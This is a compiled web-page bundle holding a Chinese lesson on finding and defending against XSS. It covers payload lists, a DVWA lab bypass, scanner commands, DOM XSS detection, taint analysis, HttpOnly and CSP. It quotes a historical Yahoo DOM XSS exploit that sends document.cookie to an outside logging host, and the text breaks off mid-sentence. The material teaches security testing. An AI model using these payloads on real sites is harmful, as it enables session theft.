import{_ as l,j as n,o as e,g as c,k as p,h as a,Q as o,s}from"./chunks/framework.4e7d56ce.js";const z=JSON.parse('{"title":"05XSS：漏洞的检测与防御","description":"","frontmatter":{},"headers":[],"relativePath":"posts/devops/Web 安全攻防之道_文档/(5973) 05  XSS：漏洞的检测与防御.md","filePath":"posts/devops/Web 安全攻防之道_文档/(5973) 05  XSS：漏洞的检测与防御.md","lastUpdated":null}'),r={name:"posts/devops/Web 安全攻防之道_文档/(5973) 05  XSS：漏洞的检测与防御.md"},i=o(`<h1 id="_05xss-漏洞的检测与防御" tabindex="-1">05XSS：漏洞的检测与防御 <a class="header-anchor" href="#_05xss-漏洞的检测与防御" aria-label="Permalink to &quot;05XSS：漏洞的检测与防御&quot;">​</a></h1><p>你好，我是赢少良。上一讲我介绍了反射型 XSS、存储型 XSS 和 DOM 型 XSS 的原理，以及常见的漏洞攻击手法。这一讲我们就来学习下如何挖掘 XSS 漏洞，又如何防御 XSS 漏洞。</p><p>目前 Flash 已经被各大浏览器禁用，Adobe 官方也不再更新 Flash 相关产品。 HTML5 技术已经基本替换掉 Flash，因此不再介绍 Flash 相关的漏洞。</p><h3 id="xss-漏洞挖掘" tabindex="-1">XSS 漏洞挖掘 <a class="header-anchor" href="#xss-漏洞挖掘" aria-label="Permalink to &quot;XSS 漏洞挖掘&quot;">​</a></h3><p>XSS 漏洞挖掘的方法可以按有无源码的情况分为黑盒测试和白盒测试。</p><p><strong>黑盒测试</strong>主要是通过发送特意构造攻击字符串来验证漏洞，比如 &lt;script&gt; alert(1)&lt;/script&gt;。请求后看是否会弹框，若会则代表存在 XSS，反之则不存在。</p><p><strong>白盒测试</strong>是通过分析源代码来检测 XSS 漏洞，根据不同的编程语言采取不同的词法、语法分析方式，然后通过污点分析（追踪用户的输入数据是否达到特定的漏洞触发函数）的思路来检测漏洞。</p><p>我们来具体了解一下这两种方法。</p><h4 id="黑盒测试" tabindex="-1">黑盒测试 <a class="header-anchor" href="#黑盒测试" aria-label="Permalink to &quot;黑盒测试&quot;">​</a></h4><p>对于测试人员，多数情况下是没有目标网站的源码，对这种无源码的网站测试，我们称为黑盒测试。下面我会从人工测试和工具自动测试两方面来讲解一些常用的黑盒测试技术。</p><p><strong>人工测试</strong></p><p>人工测试的主要思路就是在一切可输入数据的地方输入&quot;XSS payload&quot;（测试用例），这些地方包括所有的 GET、POST、Cookie、HTTP 头。提交数据之后，看网站的输出是否解析了前面输入的 XSS payload。</p><p>我常用的 XSS payload 有以下几个。搜索&quot;XSS cheat sheet&quot;，也可以找到很多这种测试用例。</p><ul><li><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noreferrer">Cross-site scripting (XSS) cheat sheet</a></p></li><li><p><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank" rel="noreferrer">XSS Filter Evasion Cheat Sheet</a></p></li><li><p><a href="http://html5sec.org/" target="_blank" rel="noreferrer">HTML5 Security Cheatsheet</a></p></li></ul><p>平时测试时，我喜欢先将上面的 XSS payload 整理放在一个 txt 文件中，然后用数字区分每个用例，比如：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#79B8FF;">XSS</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">id</span><span style="color:#FDAEB7;font-style:italic;">=x</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">tabindex</span><span style="color:#FDAEB7;font-style:italic;">=1</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">onactivate</span><span style="color:#FDAEB7;font-style:italic;">=alert(1)&gt;&lt;/XSS&gt;</span></span>
<span class="line"><span style="color:#FDAEB7;font-style:italic;">&lt;body</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">onafterprint</span><span style="color:#FDAEB7;font-style:italic;">=alert(2)&gt;</span></span>
<span class="line"><span style="color:#FDAEB7;font-style:italic;">&lt;XSS</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">onafterscriptexecute</span><span style="color:#FDAEB7;font-style:italic;">=alert(3)&gt;&lt;script&gt;1&lt;/script&gt;</span></span>
<span class="line"><span style="color:#FDAEB7;font-style:italic;">&lt;body</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">onbeforeprint</span><span style="color:#FDAEB7;font-style:italic;">=alert(4)&gt;</span></span>
<span class="line"><span style="color:#FDAEB7;font-style:italic;">&lt;svg&gt;&lt;animate</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">onbegin</span><span style="color:#FDAEB7;font-style:italic;">=alert(5)</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">attributeName</span><span style="color:#FDAEB7;font-style:italic;">=x</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">dur</span><span style="color:#FDAEB7;font-style:italic;">=1s&gt;</span></span>
<span class="line"><span style="color:#FDAEB7;font-style:italic;">......</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#005CC5;">XSS</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">id</span><span style="color:#B31D28;font-style:italic;">=x</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">tabindex</span><span style="color:#B31D28;font-style:italic;">=1</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">onactivate</span><span style="color:#B31D28;font-style:italic;">=alert(1)&gt;&lt;/XSS&gt;</span></span>
<span class="line"><span style="color:#B31D28;font-style:italic;">&lt;body</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">onafterprint</span><span style="color:#B31D28;font-style:italic;">=alert(2)&gt;</span></span>
<span class="line"><span style="color:#B31D28;font-style:italic;">&lt;XSS</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">onafterscriptexecute</span><span style="color:#B31D28;font-style:italic;">=alert(3)&gt;&lt;script&gt;1&lt;/script&gt;</span></span>
<span class="line"><span style="color:#B31D28;font-style:italic;">&lt;body</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">onbeforeprint</span><span style="color:#B31D28;font-style:italic;">=alert(4)&gt;</span></span>
<span class="line"><span style="color:#B31D28;font-style:italic;">&lt;svg&gt;&lt;animate</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">onbegin</span><span style="color:#B31D28;font-style:italic;">=alert(5)</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">attributeName</span><span style="color:#B31D28;font-style:italic;">=x</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">dur</span><span style="color:#B31D28;font-style:italic;">=1s&gt;</span></span>
<span class="line"><span style="color:#B31D28;font-style:italic;">......</span></span></code></pre></div><p>然后将其一次性全复制进输入框中测试，看提交后有没有弹框，若弹框了，通过对应数字就能知道是哪个测试用例被成功执行了。有时输入长度有限制，就只能一个个测试，然后根据响应内容做一些调整。</p><p>上面这种测试方法相对暴力一些，有时网站有自己的一些数据处理逻辑（过滤、编码、输入类型判断等等），这时就需要一些探测性的输入，比如输入以下字符串：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#9ECBFF;">&quot;&#39;&lt;script&gt;;&amp;#,/=(12345)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#032F62;">&quot;&#39;&lt;script&gt;;&amp;#,/=(12345)</span></span></code></pre></div><p>在返回页面的源码中搜索 12345 的输出位置，以及上面这些特殊字符的过滤情况。</p><p>以 DVWA 靶场中的 XSS（Reflected）题目为例。在 DVWA Security 中安全等级为 High，如下图所示：</p>`,21),y=s("p",null,'图 1：设置 DVWA 安全等级为"High"',-1),g=s("p",null,"先在题目中输入前面那串测试字符串去探测下：",-1),h=s("p",null,"图 2：输入测试字符串",-1),S=s("p",null,'在网页中右击菜单，选择"检查"查看源码，直接搜索"12345"，可以看到数据的输出位置：',-1),E=o('<p>图 3：查看源码定位输出位置</p><p>可以发现，输出位置在<code>&lt;pre&gt;</code>标签内，并且过滤掉了&quot;&lt;script&quot;（不包括引号）。尝试输入以下字符串看是否会有转机：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#9ECBFF;">&quot;&#39;&lt;scr&lt;scriptipt&gt;;&amp;#,/=(12345)</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#032F62;">&quot;&#39;&lt;scr&lt;scriptipt&gt;;&amp;#,/=(12345)</span></span></code></pre></div><p>结果发现还是没用：</p>',4),d=o('<p>图 4：更改测试字符串</p><p>既然没法用<code>&lt;script&gt;</code>标签，我们就换个其他的标签试下。如果你不熟悉测试用例，可以回头翻看下前面介绍的 XSS cheat sheet。这里我改用了<code>&lt;img&gt;</code>标签（下面的数字一样都是为了方便搜索源码）：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">img</span><span style="color:#F97583;">&gt;</span><span style="color:#79B8FF;">12345</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">img</span><span style="color:#D73A49;">&gt;</span><span style="color:#005CC5;">12345</span></span></code></pre></div>',3),_=o('<p>图 5：测试&lt; img &gt;标签</p><p>可以看到，<code>&lt;img&gt;</code>被解析了。前面我们已经测试过，各种特殊字符也没过滤。这样我们就可以构造完整的测试用例试下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">&lt;</span><span style="color:#E1E4E8;">img src</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">a onerror</span><span style="color:#F97583;">=</span><span style="color:#B392F0;">alert</span><span style="color:#E1E4E8;">(</span><span style="color:#79B8FF;">1</span><span style="color:#E1E4E8;">)</span><span style="color:#F97583;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&lt;</span><span style="color:#24292E;">img src</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">a onerror</span><span style="color:#D73A49;">=</span><span style="color:#6F42C1;">alert</span><span style="color:#24292E;">(</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">)</span><span style="color:#D73A49;">&gt;</span></span></code></pre></div><p>成功弹出提示框：</p>',4),u=s("p",null,"图 6：成功利用< img>标签执行任意 JS 代码",-1),C=s("p",null,"返回数据如下，输入数据都被完整地解析执行。",-1),m=o(`<p>图 7：被解析的代码</p><p>这里我总结一下人工测试思路：日常收集一些 XSS cheat sheet，然后编号整理出来，用于日常测试用例；你可以先一次性批量输入测试，如果无效，再输入一些特殊字符看过滤情况，根据返回数据作相应的调整测试。</p><p>除了一些比较深的操作入口，并且涉及一些前置的操作条件（比如验证码、开启特定设置之类的），不然多数情况下，整个过程其实可以通过自动化工具实现。</p><p><strong>工具自动化测试</strong></p><p>在《01 | 武器库：常用的渗透测试工具》中我介绍了一些常用的渗透测试工具，里面有支持 XSS 扫描的工具，比如 AWVS、Xray、Goby 这类综合型扫描器。</p><p>这里我推荐一款专门针对 XSS 漏洞扫描的开源工具，<a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noreferrer">XSStrike</a>，它在业内也是有一定名气的。由于开源，非常有利于自己添加 XSS payload，或者做二次开发。</p><p>XSStrike 支持很多功能，比如 DOM XSS 扫描（基于正则扫描敏感函数，存在一定误报）、WAF 检测与绕过、爬虫、HTML＆JS 动态解析引擎验证。常用的测试命令如下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">爬虫整个网站进行 XSS 扫描：</span></span>
<span class="line"><span style="color:#E1E4E8;">python3 XSStrike.py </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">u </span><span style="color:#9ECBFF;">&quot;http://testphp.vulnweb.com/&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">--</span><span style="color:#E1E4E8;">crawl</span></span>
<span class="line"><span style="color:#E1E4E8;">针对单个 URL 进行扫描：</span></span>
<span class="line"><span style="color:#E1E4E8;">python3 XSStrike.py </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">u </span><span style="color:#9ECBFF;">&quot;http://localhost/vulnerabilities/XSS_r/?name=a&quot;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">爬虫整个网站进行 XSS 扫描：</span></span>
<span class="line"><span style="color:#24292E;">python3 XSStrike.py </span><span style="color:#D73A49;">-</span><span style="color:#24292E;">u </span><span style="color:#032F62;">&quot;http://testphp.vulnweb.com/&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">--</span><span style="color:#24292E;">crawl</span></span>
<span class="line"><span style="color:#24292E;">针对单个 URL 进行扫描：</span></span>
<span class="line"><span style="color:#24292E;">python3 XSStrike.py </span><span style="color:#D73A49;">-</span><span style="color:#24292E;">u </span><span style="color:#032F62;">&quot;http://localhost/vulnerabilities/XSS_r/?name=a&quot;</span></span></code></pre></div><p>以 AWVS 的在线靶场为例，它可以检测搜索框存在的 XSS 漏洞：</p>`,9),A=o('<p>图 8：XSStrike</p><p>XSStrike 功能比较全面，但也会存在误报，而且告警结果展示的体验不是很好。</p><p>因此，这里再推荐另一款工具，叫 <a href="https://github.com/lwzSoviet/NoXss" target="_blank" rel="noreferrer">NoXSS</a>。它的特点就是批量扫描速度快，而且告警展示效果比 XSStrike 好，但漏洞检测能力不如 XSStrike，你可以把这两款搭配着使用。NoXSS 的使用方法也很简单，常用命令如下：</p><div class="language-java vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">python start.py </span><span style="color:#F97583;">--</span><span style="color:#E1E4E8;">url</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;http://localhost/vulnerabilities/XSS_r/?name=a&quot;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">python start.py </span><span style="color:#D73A49;">--</span><span style="color:#24292E;">url</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;http://localhost/vulnerabilities/XSS_r/?name=a&quot;</span></span></code></pre></div>',4),F=o('<p>图 9：NoXSS</p><p>DOM XSS 的扫描相比常规 XSS 要难一些，主要是针对 JS 代码的分析，如果只是简单的正则匹配，就很容易误报漏报。所以针对 DOM XSS 的检测，除了常规的 XSS payload 暴力测试、正则匹配检测代码外，还可以基于以下几种常见方法来检测 XSS。</p><ul><li><p>Headless Chrome：利用无界面 Chrome 浏览器来检测 XSS，参考《<a href="https://paper.seebug.org/641/" target="_blank" rel="noreferrer">基于 Chrome-headless 的 XSS 检测</a>》，这是目前主流的动态检测方法。</p></li><li><p>QtWebKit：参考《<a href="https://security.tencent.com/index.php/blog/msg/12" target="_blank" rel="noreferrer">基于 QtWebKit 的 DOM XSS 检测技术</a>》，QtWebKit 作者已停止维护。</p></li><li><p>PhantomJS：已停止维护。它提供一套基于 WebKit 的服务器端 JavaScript API，可以在无浏览器支持的情况下实现 Web 浏览器功能的支持，例如 DOM 处理、JavaScript、CSS 选择器、JSON、Canvas 和可缩放矢量图形 SVG 等功能。</p></li></ul><p>这些方法可以实现动态解析 JS，以验证特意构造的 XSS payload 是否被执行，从而准确地判断是否存在 XSS 漏洞。</p><p>这种动态检测 DOM XSS 的工具，个人特别推荐 Dominator。它是基于 Firefox 改造的，在一些关键的输入输出函数添加 Hook，如果发现有用户可控数据输出到一些 sink 漏洞触发函数上就会告警。它的特点是发现率高，虽然也有不少误报。此前我用它发现了不少国内知名网站的 DOM XSS，有些不同域名的网站引用到同一个漏洞 JS 文件，导致一个漏洞影响一大批网站。</p><p>以之前一些 Yahoo DOM XSS 为例，当你用 Dominator 访问了存在漏洞的页面后，可以看到其输出的告警内容如下：</p>',6),b=o(`<p>图 10：用 Dominator 检测 DOM XSS</p><p>提示 windows.name 输入数据被直接传递给 eval 函数，也就是说如果你能控制 windows.name 的值，就可以实现任意 JS 代码的执行。利用起来也非常简单，我们可以看下漏洞发现者 Abysssec 公司发布的利用代码：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">html</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">script</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">window.name=&#39; new Image().src=&quot;http://abysssec.com/log/log.php?cookie=&quot;+encodeURI(document.cookie);</span></span>
<span class="line"><span style="color:#E1E4E8;">setTimeout(\\&quot;location.href = \\&#39;http:\\/\\/www.yahoo.com\\&#39;;\\&quot;,10);&#39;;</span></span>
<span class="line"><span style="color:#E1E4E8;">location.href=&quot;http://adspecs.yahoo.com/index.php&quot;;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">script</span><span style="color:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="color:#E1E4E8;">&lt;/</span><span style="color:#85E89D;">html</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">html</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">script</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">window.name=&#39; new Image().src=&quot;http://abysssec.com/log/log.php?cookie=&quot;+encodeURI(document.cookie);</span></span>
<span class="line"><span style="color:#24292E;">setTimeout(\\&quot;location.href = \\&#39;http:\\/\\/www.yahoo.com\\&#39;;\\&quot;,10);&#39;;</span></span>
<span class="line"><span style="color:#24292E;">location.href=&quot;http://adspecs.yahoo.com/index.php&quot;;</span></span>
<span class="line"><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">script</span><span style="color:#24292E;">&gt;</span></span>
<span class="line"><span style="color:#24292E;">&lt;/</span><span style="color:#22863A;">html</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><p>利用思路就是直接设置 window.name 参数，插入打算执行的 JS 代码，然后用 location.href 跳转到漏洞页面去触发。这类漏洞我在网易的一些网站上也发现了不少，也是用 Dominator 挖掘到的，所以个人比较推荐。</p><h4 id="白盒测试" tabindex="-1">白盒测试 <a class="header-anchor" href="#白盒测试" aria-label="Permalink to &quot;白盒测试&quot;">​</a></h4><p>如果我们有网站源码，就可以直接通过分析源码来挖掘漏洞。网站开发语言非常多， JavaScript、PHP、Python、Go、C/C++等等都可以用来开发网站的前端和后端。不同的语言有不同的特性，在源码审计时需要采取不同的检测点，但有一个共同的思路，那就是<strong>污点分析的检测思路</strong>。</p><p>前面我已经简单地提到污点分析原理就是检测用户可控的输入数据，污点也就是用户可控的输入数据。然后我们去追踪污点的传播过程，检测是否传递给危险的输出函数。对于 XSS 就是能够控制页面内容或者执行 JS 的输出函数有 echo、eval等。</p><p>有时我们也会反着来：先查看一些危险的输出函数，再回溯它的参数传递，判断是否有未经过滤的用户输入数据，若有就代表可能存在漏洞。其他漏洞类型，以及其他编程语言的代码审计方式都是相通的，只是有不同的 sinks 和过滤函数需要作为检测点。</p>`,8),v=s("p",null,"图 11：污点分析流程",-1),X=s("p",null,"以 PHP 源码审计为例，常见的污点 source 有以下这些：",-1),k=s("p",null,"关于 XSS 常见的污点触发位置 sink 有以下这些：",-1),D=o('<p>我在审计代码时，习惯使用 VSCode 和 Sublime，你可以根据自己的喜好选择一款合适的代码阅读软件，然后批量搜索文件中的 sink 位置，再往上回溯追踪是否有引入 source 污染数据；若引入了，有没有做好过滤转义等安全工作。</p><p>关于 DOM XSS 的审计，主要是针对 JS 代码的审计，关于它的 srouces &amp; sinks，我已在《<strong>04｜XSS：劫持身份的惯犯</strong>》的图 14 中给出，此处不再赘述；你也可以按照污点分析的思路去做 JS 代码审计。</p><p>主流的自动化源码审计工具有 RIPS、Coverity、CheckMarx 等等，都是一些商业软件。近两年也有一些优秀的开源项目贡献，比如 <a href="https://github.com/LoRexxar/Kunlun-M" target="_blank" rel="noreferrer">Kunlun-M</a>，目前作者仍在更新维护中。如果你或者你所在的公司没有条件采购商业软件，这也是一个不错的选择。</p><h3 id="防御-xss-攻击" tabindex="-1">防御 XSS 攻击 <a class="header-anchor" href="#防御-xss-攻击" aria-label="Permalink to &quot;防御 XSS 攻击&quot;">​</a></h3><p>以前在面试一些同学时，问他们怎么修复 XSS，都会说做好过滤，但具体怎么做过滤，很多都答不上来。有的会简单说下做 HTML 实体化编码，比如用 htmlspecialchars 函数，但其实这是错误的。XSS 的防御必须根据不同的触发位置采取不同的防御方案，下面我们来详细了解一下。</p><h4 id="输入检查" tabindex="-1">输入检查 <a class="header-anchor" href="#输入检查" aria-label="Permalink to &quot;输入检查&quot;">​</a></h4><p>在测试 XSS 时，经常需要输入一些特殊字符，所以在一开始直接做好输入检查有利于减少攻击的可能性。我在协助业务修复漏洞的时候，经常推荐的方法就是白名单限制，比如参数是个整数值，那直接限制死即可，若不符合就抛异常。不要单纯只想着过滤替换特殊字符，这很容易就被绕过了。</p><p>如果白名单范围不好确定，我就会采用黑名单的方式，把常用的 XSS payload 特殊字符或字符串做检测，比如<code>&lt;script&gt;</code>、javascript:、&lt;、&gt;、&#39;、&quot;、&amp;、#。但是黑名单这种方式，有时结合业务场景，以及浏览器特性，就有可能找到绕过方法。</p><p>还有一定不要单纯只在客户端上做过滤，还要结合服务端做限制。若只是客户端上做过滤，那么抓包后修改数据重发就绕过了。</p><h4 id="输出检查" tabindex="-1">输出检查 <a class="header-anchor" href="#输出检查" aria-label="Permalink to &quot;输出检查&quot;">​</a></h4><p>跨站漏洞的触发关键点就在于输出的位置，所以对输出进行检查尤为重要。</p><p>以前百度 Hi 空间有个 XSS 漏洞，官方后来虽然修复了， 但发现者的百度 Hi 空间仍存在 XSS 弹框。这正是因为官方的修复方案中只做了输入检查，没有过输出检查，导致以前曾被利用过的 XSS payload 仍然有效。如果在官方修复前，那个 XSS 漏洞已经被恶意利用了，那即使已经通过输入检查方法修复了，被插入的恶意代码仍会存在，这可以认为是修复不彻底的表现。</p><p>有时网站需要支持富文本（用户自定义的 HTML 代码），比如为方便用户而保留的<code>&lt;a&gt;</code>链接标签，此时采用白名单的方式，直接限制允许输入的标签、字符是最佳方案。</p><p>那我们应该如何根据不同的位置采取不同的 XSS 防御方案呢？我整理了一份表格（由于 DOM XSS 情况特殊，我会单独用一个小节来介绍）。</p>',14),f=s("h4",{id:"防御-dom-xss",tabindex:"-1"},[a("防御 DOM XSS "),s("a",{class:"header-anchor",href:"#防御-dom-xss","aria-label":'Permalink to "防御 DOM XSS"'},"​")],-1),q=s("p",null,"DOM XSS 是一种特殊的 XSS 类型，前面介绍的一些防御方法并不那么通用，需要根据输出位置做不同的防御方法。同样的，我整理了一份 DOM XSS 防御方案表格，供你参考。",-1),T=s("h4",{id:"httponly-cookie",tabindex:"-1"},[a("Httponly Cookie "),s("a",{class:"header-anchor",href:"#httponly-cookie","aria-label":'Permalink to "Httponly Cookie"'},"​")],-1),B=s("p",null,"如果你在 Cookie 中设置了 HttpOnly 属性，那 JavaScript 脚本将无法读取到 Cookie，这样就能防止通过 XSS 窃取 Cookie，在一定程度上能够减少 XSS 的攻击范围。",-1),P=s("p",null,"用 EditThisCookie 插件看下拉勾网的 Cookie，可以发现其中 JSESSIONID 就开启 HttpOnly。",-1),x=o(`<p>图 12：开启 HttpOnly Cookie</p><p>在 PHP 中，可以使用 setcookie 或 setrawcookie 的第 7 个参数来开启，将其设置为 TRUE 即可 HttpOnly：</p><div class="language-php vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">php</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#79B8FF;">setcookie</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;abc&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#9ECBFF;">&quot;test&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">TRUE</span><span style="color:#E1E4E8;">); </span></span>
<span class="line"><span style="color:#79B8FF;">setrawcookie</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;abc&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#9ECBFF;">&quot;test&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">NULL</span><span style="color:#E1E4E8;">, </span><span style="color:#79B8FF;">TRUE</span><span style="color:#E1E4E8;">);</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#005CC5;">setcookie</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;abc&quot;</span><span style="color:#24292E;">, </span><span style="color:#032F62;">&quot;test&quot;</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">TRUE</span><span style="color:#24292E;">); </span></span>
<span class="line"><span style="color:#005CC5;">setrawcookie</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;abc&quot;</span><span style="color:#24292E;">, </span><span style="color:#032F62;">&quot;test&quot;</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">NULL</span><span style="color:#24292E;">, </span><span style="color:#005CC5;">TRUE</span><span style="color:#24292E;">);</span></span></code></pre></div><h4 id="content-security-policy" tabindex="-1">Content Security Policy <a class="header-anchor" href="#content-security-policy" aria-label="Permalink to &quot;Content Security Policy&quot;">​</a></h4><p>内容安全策略（Content Security Policy，CSP）也是减少 XSS 攻击的一种方式 ，是浏览器提供一种防御机制。它采用的是白名单机制，告诉浏览器可以加载和执行哪些外部资源，这样就能防止被一些第三方恶意脚本注入执行。</p><p>开启 CSP 有两种方式：</p><p>（1）通过 HTTP 头信息的 Content-Security-Policy 的字段：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;style-src cdn.example.org third-party.org; child-src https:</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;style-src cdn.example.org third-party.org; child-src https:</span></span></code></pre></div><p>（2）通过网页的<code>&lt;meta&gt;</code>标签设置：</p><div class="language-xml vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">xml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#E1E4E8;">&lt;</span><span style="color:#85E89D;">meta</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">http-equiv</span><span style="color:#E1E4E8;">=</span><span style="color:#9ECBFF;">&quot;Content-Security-Policy&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">content</span><span style="color:#E1E4E8;">=</span><span style="color:#9ECBFF;">&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;</span><span style="color:#E1E4E8;">&gt;</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#24292E;">&lt;</span><span style="color:#22863A;">meta</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">http-equiv</span><span style="color:#24292E;">=</span><span style="color:#032F62;">&quot;Content-Security-Policy&quot;</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">content</span><span style="color:#24292E;">=</span><span style="color:#032F62;">&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;</span><span style="color:#24292E;">&gt;</span></span></code></pre></div><p>这里我对一些常用字段先做个解释：</p>`,11),M=s("p",null,"常用指令值解释如下：",-1),w=s("p",null,"之前有次测试，发现了一个 XSS 漏洞，但死活利用不成功，搞半天一直没找到原因，后来发现正是 CSP 限制了 JS 资源的加载执行。",-1),N=s("p",null,"我平时测试时喜欢使用 CSP Evaluator 插件查看网站的 CSP 设置情况。Gmail 的 CSP 设置情况如下图所示：",-1),L=s("p",null,"图 13：Gmail 的 CSP 设置",-1),V=s("p",null,"在实际测试 XSS 时，有时也需要注意下 CSP 